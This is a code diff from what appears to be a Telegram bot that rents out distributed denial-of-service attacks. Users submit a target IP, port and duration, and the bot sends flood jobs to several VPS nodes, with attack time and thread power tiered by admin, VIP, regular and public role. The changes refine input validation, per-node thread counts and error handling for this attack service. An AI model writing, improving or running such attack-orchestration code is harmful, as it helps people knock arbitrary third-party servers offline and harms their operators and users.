+                f"🔒 Access Denied\n{auth['message']}",
+                parse_mode='Markdown'
+            )
+            return
+
     try:
         # 🧠 Parse Input
-        target_ip, port_str, duration_str = message.text.split()
-        target_port = int(port_str)
-        duration = int(duration_str)
-
-        # ✅ Input Validation
+        parts = message.text.split()
+        if len(parts) != 3:
+            raise ValueError("Invalid format. Use: IP PORT TIME")
+            
+        target_ip, port_str, duration_str = parts
+        
+        # Validate IP
         if not validate_ip(target_ip):
-            raise ValueError("🚨 Invalid IP format! Please enter a valid IPv4 address.")
-        if not (1 <= target_port <= 65535):
-            raise ValueError("🚫 Port must be between 1 and 65535.")
-        if target_port in BLOCKED_PORTS:
-            raise ValueError(f"❌ Port `{target_port}` is blocked by the system.")
+            raise ValueError("Invalid IP address format")
+            
+        # Validate port
+        try:
+            target_port = int(port_str)
+            if not (1 <= target_port <= 65535):
+                raise ValueError("Port must be between 1-65535")
+            if target_port in BLOCKED_PORTS:
+                raise ValueError(f"Port {target_port} is blocked")
+        except ValueError:
+            raise ValueError("Invalid port number")
+
+        # Validate duration
+        try:
+            duration = int(duration_str)
+            if duration <= 0:
+                raise ValueError("Duration must be positive")
+        except ValueError:
+            raise ValueError("Invalid duration")
 
         # ⏱️ Time Limit Based on User Role
-        if is_admin(user_id):
+        if is_public:
+            max_time = 150  # 120 seconds for public attacks
+            threads_per_vps = THREADS_PER_VPS  # Use configured threads_per_vps instead of hardcoded 1800
+        elif is_admin(user_id):
             max_time = ADMIN_MAX_TIME
+            threads_per_vps = THREADS_PER_VPS
         elif is_vip(user_id):
             max_time = VIP_MAX_TIME
-        elif is_public:  # Public mode has lower limits
-            max_time = 150  # 2 minutes for public mode
+            threads_per_vps = THREADS_PER_VPS
         else:
             max_time = REGULAR_MAX_TIME
+            threads_per_vps = THREADS_PER_VPS
 
         if duration > max_time:
-            raise ValueError(f"⚠️ Your max time limit is `{max_time}s`. Upgrade for more power!")
+            raise ValueError(f"Max allowed time is {max_time}s")
 
-        # Also modify the VPS selection for public mode:
+        # Get active VPS list (limited for public attacks)
         vps_list = get_active_vps_list()
         if not vps_list:
-            raise ValueError("🛑 No active VPS nodes found. Please try again later.")
-        
-        # For public mode, use only 1 VPS
+            raise ValueError("No active VPS nodes available")
+            
         if is_public:
-            vps_list = [random.choice(vps_list)] if vps_list else []
-            total_power = 100  # Fixed thread count for public mode
-        else:
-            total_power = THREADS_PER_VPS * len(vps_list)
+            # For public attacks, use only the first VPS
+            vps_list = vps_list[:1]
+
+        total_power = threads_per_vps * len(vps_list)
 
         # 🆔 Attack Metadata
         attack_id = f"{user_id}_{int(time.time())}"
@@ -4570,7 +4712,7 @@ def handle_attack_command(message):
         )
 
         # 🔥 Attack Execution
-        results = execute_distributed_attack(vps_list, target_ip, target_port, duration)
+        results = execute_distributed_attack(vps_list, target_ip, target_port, duration, threads_per_vps)
 
         # ✅ Completion Message
         bot.send_message(
@@ -4600,7 +4742,7 @@ def handle_attack_command(message):
         )
 
     except Exception as e:
-        logger.error(f"Attack error: {str(e)}")
+        logger.error(f"Attack error: {str(e)}", exc_info=True)
         bot.send_message(
             chat_id,
             f"⚠️ *SYSTEM ERROR*\n\n"
@@ -4618,7 +4760,8 @@ if __name__ == '__main__':
 
     # Load initial data
     keys = load_keys()
-    load_data()  # Load group settings and other data
+    # Remove load_data() call as the function doesn't exist
+    # All necessary data loading is handled by individual load_* functions
 
     while True:
         try:
@@ -4626,8 +4769,8 @@ if __name__ == '__main__':
             bot.remove_webhook()
             time.sleep(1)
             
-            # Save data before starting
-            save_data()
+            # Remove save_data() call as the function doesn't exist
+            # Data is saved by individual save_* functions when needed
             
             bot.infinity_polling(
                 skip_pending=True,
@@ -4640,8 +4783,8 @@ if __name__ == '__main__':
             import traceback
             traceback.print_exc()
             
-            # Save data before restarting
-            save_data()
+            # Remove save_data() call as the function doesn't exist
+            # Data is saved by individual save_* functions when needed
             
             logger.info("Restarting bot in 5 seconds...")
             time.sleep(5)
@@ -4650,10 +4793,9 @@ if __name__ == '__main__':
             logger.info("Bot shutdown cleanup...")
             try:
                 bot.remove_webhook()
-                save_data()  # Ensure data is saved on shutdown
+                # Remove save_data() call as the function doesn't exist
             except Exception as cleanup_error:
                 logger.warning(f"Cleanup error: {cleanup_error}")
-
 
 # --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
